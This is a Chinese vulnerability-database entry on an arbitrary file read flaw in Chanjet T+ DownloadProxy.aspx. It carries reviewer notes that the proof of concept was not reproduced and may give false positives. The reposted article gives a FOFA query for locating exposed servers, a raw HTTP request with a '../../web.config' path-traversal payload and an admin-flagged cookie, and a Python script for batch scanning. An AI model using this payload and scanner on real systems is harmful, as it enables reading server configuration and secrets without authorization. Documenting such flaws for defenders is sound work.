---
source: "MrWQ/vulnerability-paper"
title: "畅捷通T+ DownloadProxy Path文件读取"
product: "畅捷通T+"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未列"
prerequisites: "原始请求含admin标记Cookie，脚本无Cookie"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/bnlmVUYbzg_8EI1OMLsc1Q"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%95%85%E6%8D%B7%E9%80%9AT%2B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9A%20T%2B%20DownloadProxy.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
id: "vw-4701d4da98972a88c3689c21"
entity_id: "ve-4701d4da98972a88c3689c21"
schema_version: "1"
---

# 畅捷通T+ DownloadProxy Path文件读取

## 条目说明

- 对象与具体问题：畅捷通T+；DownloadProxy Path文件读取
- 版本、配置及部署条件：版本未列
- 认证与权限前提：原始请求含admin标记Cookie，脚本无Cookie
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 目录畅捷通与畅捷通T+重复分类
- 脚本仅200且value字串为阳性易误报，finally return掩盖异常
- 需区分无Cookie脚本与认证样例，缺版本/补丁

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/bnlmVUYbzg_8EI1OMLsc1Q)

##### 漏洞描述

用友 畅捷通 T+ DownloadProxy.aspx 文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件

##### 漏洞影响

```
用友 畅捷通T+

```

##### fofa：

```
app="畅捷通-TPlus"

```

##### 漏洞复现

登录页面：

```
http://xxx.xxx.xx.xxx:8080/tplus/view/login.html

```

![](https://mmbiz.qpic.cn/mmbiz_png/sajqow3Sgia7kWJlefpiaW49YyAtyfj1YM5ZJw5lQHYRaic1CFkpDCcxRX3cVakaKq3x391D1lKvnzGy6xygzGNbQ/640?wx_fmt=png)

验证 POC

```
/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config

```

```http
GET /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../web.config HTTP/1.1
Host: xxx.xxx.xx.xxx:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ASP.NET_SessionId=xf1qosdhzc432rynj3scyr4b; _sid=admin
If-None-Match: W/"5987cf44-7aab"
If-Modified-Since: Mon, 07 Aug 2017 02:24:04 GMT
Connection: close

```

![](https://mmbiz.qpic.cn/mmbiz_png/sajqow3Sgia7kWJlefpiaW49YyAtyfj1YMvceWYduRC1nX6zexVc2Najs9pYjGu19IpyLNMKs0gTBp8fnc7rjtLg/640?wx_fmt=png)

使用 tr0uble_mAker 大佬的 POC bomber 工具，并为其编写 poc，可以做批量化漏洞检测。（ps: 该工具非常好用）

项目地址：  

```
https://github.com/tr0uble-mAker/POC-bomber

```

poc：  

```
#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2022/12/10 15:09
# @Author  : zhang3
import requests
import urllib
import re
def verify(url):
    headers = {"Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
               "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"
               }
    result={
        'name':'用友 畅捷通T+ DownloadProxy.aspx 任意文件读取漏洞',
        'vulnerable': False
    }
    try:
        payload='/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config'
        url=url.strip()
        v_url=urllib.parse.urljoin(url,payload)
        res=requests.get(url=v_url,headers=headers,timeout=9)
        #判断是否存在漏洞
        if res.status_code==200 and re.search('value',res.text):
            # res.status_code==200 and 'value' in res.text:
            result['vulnerable']=True
            result['url']=url
            result['method']='GET'
            result['payload']=v_url
            result['about']='https://github.com/xxx'
        return result
    except:
        return result
    finally:
        return result

```

检测效果：   （工具的具体使用请移步原作者项目地址）  

![](https://mmbiz.qpic.cn/mmbiz_png/sajqow3Sgia7kWJlefpiaW49YyAtyfj1YMvppndvqIRqcoM7rVjL8iaHC6zY6vbwAeqoH4qKhGUn59hp7X8xPViaEw/640?wx_fmt=png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
